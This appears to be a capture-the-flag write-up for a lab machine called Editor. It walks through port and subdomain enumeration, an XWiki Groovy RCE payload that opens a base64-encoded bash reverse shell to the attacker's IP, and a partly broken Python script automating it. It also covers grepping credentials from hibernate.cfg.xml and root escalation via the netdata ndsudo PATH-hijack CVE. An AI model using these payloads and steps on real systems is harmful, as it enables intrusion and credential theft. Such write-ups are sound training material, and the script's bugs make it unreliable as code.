# scan ports

```
nmap -sVC 10.10.11.80 
```

it rsults

```
Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-20 05:40 EST
Nmap scan report for 10.10.11.80
Host is up (0.45s latency).
Not shown: 997 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
|_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
80/tcp   open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://editor.htb/
8080/tcp open  http    Jetty 10.0.20
|_http-open-proxy: Proxy might be redirecting requests
|_http-server-header: Jetty(10.0.20)
| http-methods: 
|_  Potentially risky methods: PROPFIND LOCK UNLOCK
| http-robots.txt: 50 disallowed entries (15 shown)
| /xwiki/bin/viewattachrev/ /xwiki/bin/viewrev/ 
| /xwiki/bin/pdf/ /xwiki/bin/edit/ /xwiki/bin/create/ 
| /xwiki/bin/inline/ /xwiki/bin/preview/ /xwiki/bin/save/ 
| /xwiki/bin/saveandcontinue/ /xwiki/bin/rollback/ /xwiki/bin/deleteversions/ 
| /xwiki/bin/cancel/ /xwiki/bin/delete/ /xwiki/bin/deletespace/ 
|_/xwiki/bin/undelete/
| http-webdav-scan: 
|   Allowed Methods: OPTIONS, GET, HEAD, PROPFIND, LOCK, UNLOCK
|   WebDAV type: Unknown
|_  Server Type: Jetty(10.0.20)
| http-title: XWiki - Main - Intro
|_Requested resource was http://10.10.11.80:8080/xwiki/bin/view/Main/
| http-cookie-flags: 
|   /: 
|     JSESSIONID: 
|_      httponly flag not set
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 19.56 seconds
```

i put the ip in browser i found that redirects to editor.htb so lets add it to our hosts config file

```
sudo nano /etc/hosts
```


i found that we can download their .deb and .exe file so before doing any that lets first check hidden pages

```
gobuster dir -u  http://editor.htb/  -w /usr/share/dirb/wordlists/common.txt
```

```
========================================
gobuster scan :
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/assets               (Status: 301) [Size: 178] [--> http://editor.htb/assets/]
/index.html           (Status: 200) [Size: 631]
Progress: 4614 / 4615 (99.98%)
===============================================================
Finished
===============================================================
```


no thing intersting lets check subdomains

```
ffuf -c -u http://editor.htb/  -H "Host: FUZZ.editor.htb" -w /home/kali/Desktop/subdomains-top1mil-20000.txt -fs 154
```
- -fs to skip any word with this size

it reasults us to me that

```
        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://editor.htb/
 :: Wordlist         : FUZZ: /home/kali/Desktop/subdomains-top1mil-20000.txt
 :: Header           : Host: FUZZ.editor.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 154
________________________________________________

wiki                    [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 207ms]
:: Progress: [20000/20000] :: Job [1/1] :: 178 req/sec :: Duration: [0:01:45] :: Errors: 0 ::

```


so lets add wiki.editor.htb to out hosts config too 


ok after reasearch to find any cve in this vertion of this website

i found an rce valunrabilty

>to explain the valunrablity this link has an groovy langiage rce /xwiki/bin/get/Main/SolrSearch?media=rss&text=

```
}}{{async async=false}}{{groovy}}
def cmd = "echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi4yMzQvNDQ0NCAwPiYx | base64 -d | bash"
["/bin/bash", "-c", cmd].execute()
{{/groovy}}{{/async}}
```


we decode our command to base64 to skip any detect or any thing 

bash  reverse shell command

```
bash -i >& /dev/tcp/YOUR_IP/PORT 0>&1
```
- we can create a simple automation code

```
import reqeusts
import base64
from urllib.parse import *

#vars
#get the ip

massege = """ 
██╗░░██╗░██╗░░░░░░░██╗██╗██╗░░██╗██╗
╚██╗██╔╝░██║░░██╗░░██║██║██║░██╔╝██║
░╚███╔╝░░╚██╗████╗██╔╝██║█████═╝░██║
░██╔██╗░░░████╔═████║░██║██╔═██╗░██║
██╔╝╚██╗░░╚██╔╝░╚██╔╝░██║██║░╚██╗██║
╚═╝░░╚═╝░░░╚═╝░░░╚═╝░░╚═╝╚═╝░░╚═╝╚═╝
"""
print(f"{massege}\nwelcome to skaw xwiki exploit: ")

class Xwiki():
    def __init__(self,ip,port,host):
        self.ip = ip
        self.port = port
        self.host = host

    def __str__(self):
        return f"[!] ip {self.ip} port {self.port} host {self.host}"
    
    #make payload functions
    def make_payload(self):
        #shell command
        shell = f"bash -i >& /dev/tcp/{self.ip}/{self.port} 0>&1"

        #encrypt the shell in base64
        shell = base64.b64encode(shell)

        #the payload of this exploit
        payload ="""
        "}}{{async async=false}}{{groovy}}"
        f'def cmd = "echo {shell} | base64 -d | bash"'
        '["/bin/bash", "-c", cmd].execute()'
        '{{/groovy}}{{/async}}'
        """

        encoded_payload = quote(payload) #encode the paylod with the url format
        exploit_path = f"/xwiki/bin/get/Main/SolrSearch?media=rss&text={encoded_payload}"
        full_url = urljoin(self.host, exploit_path) # make the final url

    #exploit function
    def exploit(self):
        #catcing any error
        try:
            response = requests.get(full_url, headers=headers, timeout=10) # make a get request to this link 
        
        #if the requests.exceptions.Timeout has a truth value it will print success
        except requests.exceptions.Timeout:
            print("[+] Exploit sent! Check your listner now.")
        

# if the program runnig from itself
if __name__ == "__main__":
    exploit = Xwiki("10.10.16.234","4444","http://wiki.editor.htb")
    exploit.make_payload()
    exploit.exploit()
```
and now we have a revese shell :)


ok now we have the web user shell we must get any data of the user oliver in ssh

so beacuse we know now that server uses xwiki service there is a file called hibrnate that has the sql instructions to do (because the xwiki is based on java so java lang dosent has directly acssess in sql so its save the sql insructionin this config xml file and it will converts with the hibrnate service to the pure sql instructions) so if we has accsess to this config file its called hibaernate.cfg.xml and itt most be in this directory 

```
/usr/lib/xwiki/WEB-INF/
```
as the /usr/lib stored the needed libraries or code that app need so we go to xwiki which app we want then /WEB-INFO/ which has the hibrnate config xml file we need

any ways we just need the lines that has "password" or "username" in the file we dont need the whole file so we can just use grip or you can use python script choose any way you like

as me i will just use grip directly

```
cat /usr/lib/xwiki/WEB-INF/hibernate.cfg.xml | grep -iE "user|password"
```

- -i Don't leave the word exactly as we gave it; it can have a capital letter and a lowercase letter.
- -E read the Famous instructions in programing like "|" it read this as or 

ok we found a password and we know the username from ls /home directory the users stored in /home directory if you dont know

so lets use ssh

```
ssh Oliver@10.10.11.80
```
then entery the password you collected


and we logined as Oliver user

we can get the user.txt :)

```
cat user.txt
```

# second part is privesc

i know that app using docker using found docker 0 

```
ip route
```

any ways lets get the apps with root perm

```
find / -perm -u=s -type f 2>/dev/null
```

it resaults me that

```
/opt/netdata/usr/libexec/netdata/plugins.d/cgroup-network
/opt/netdata/usr/libexec/netdata/plugins.d/network-viewer.plugin
/opt/netdata/usr/libexec/netdata/plugins.d/local-listeners
/opt/netdata/usr/libexec/netdata/plugins.d/ndsudo
/opt/netdata/usr/libexec/netdata/plugins.d/ioping
/opt/netdata/usr/libexec/netdata/plugins.d/nfacct.plugin
/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.plugin
/usr/bin/newgrp
/usr/bin/gpasswd
/usr/bin/su
/usr/bin/umount
/usr/bin/chsh
/usr/bin/fusermount3
/usr/bin/sudo
/usr/bin/passwd
/usr/bin/mount
/usr/bin/chfn
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/libexec/polkit-agent-helper-1
``` 

i searched to find any cve's on this apps and i found a cve with netdata and this the app uses docker any ways this is the cve repo i used

https://github.com/AliElKhatteb/CVE-2024-32019-POC

upload the binary file to any writeable path

then make the nvme-list use our binary file we has set to the pass


> to explain the nvme-list doesnot read the absloute path of the nvme binary like /usr/lib/... it just use the realtive path beacuse nvme in its folde so we simply make fake binary get the shell with uid 0 (root privale)
and make it read ours path that has the fake malicious name nvme program so excatly we have rce now and we can get shell with the root privlage

and now we root

```
cat /root/root.tx
``` 
